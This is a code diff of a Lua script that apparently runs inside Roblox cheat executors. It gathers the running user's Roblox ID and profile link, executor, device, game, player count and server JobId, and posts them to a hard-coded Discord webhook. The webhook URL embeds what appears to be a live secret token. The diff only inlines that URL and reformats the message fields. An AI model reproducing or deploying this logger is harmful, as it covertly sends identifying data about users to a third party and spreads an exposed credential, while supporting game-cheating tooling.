@@ -1,6 +1,4 @@
-local WebhookURL = "https://discord.com/api/webhooks/1206140541469724672/6a8r7iGrBrGBTKdFXCR-B9Sz8_lSOKetN98rplu8V0o63xAmv6aIugy5C9s1_BEPS6XR"
-
-local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
 local Profile = "[Profile](https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile)"
 local Executor = identifyexecutor()
 local Device = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "💻 PC" or "📱 Mobile"
@@ -9,8 +7,8 @@ local GameLink = "[Here](https://www.roblox.com/games/" .. game.PlaceId .. "/)"
 
 local CurrentDateandtime = os.date("%Y-%m-%d %H:%M:%S") 
 
-local response = http_request({
-    Url = WebhookURL,
+local response = request({
+    Url = "https://discord.com/api/webhooks/1206140541469724672/6a8r7iGrBrGBTKdFXCR-B9Sz8_lSOKetN98rplu8V0o63xAmv6aIugy5C9s1_BEPS6XR",
     Method = "POST",
     Headers = {
         ["Content-Type"] = "application/json"
@@ -29,32 +27,32 @@ local response = http_request({
             },
             {                        
                 ["name"] = "[🔧] Executor:",
-                ["value"] = "``` " .. Executor .. " ```",
+                ["value"] = "``` " .. "\n" .. Executor .. " ```",
                 ["inline"] = false
             },
             {            
                 ["name"] = "[❓️] Device:",
-                ["value"] = "``` " .. Device .. " ```",
+                ["value"] = "``` " .. "\n" .. Device .. " ```",
                 ["inline"] = false
             },
             {
                 ["name"] = "[🎮] Game Name:",
-                ["value"] = "``` " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " ```",
+                ["value"] = "``` " .. "\n" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " ```",
                 ["inline"] = false
             },
             {
                 ["name"] = "[🎲] Game ID:",
-                ["value"] = "``` " .. game.PlaceId .. " ```",
+                ["value"] = "``` " .. "\n" .. game.PlaceId .. " ```",
                 ["inline"] = false
             },
             {
-                ["name"] = "[👥️] Players In Server:",
-                ["value"] = "``` " .. PlayersInServer .. " ```",
+                ["name"] = "[👥️] Players In Servers:",
+                ["value"] = "``` " .. "\n" .. PlayersInServer .. " ```",
                 ["inline"] = false
             },
             {
                 ["name"] = "[🎲] Jobid:",
-                ["value"] = "``` " .. game.JobId .. " ```",
+                ["value"] = "``` " .. "\n" .. game.JobId .. " ```",
                 ["inline"] = false
             },
             {
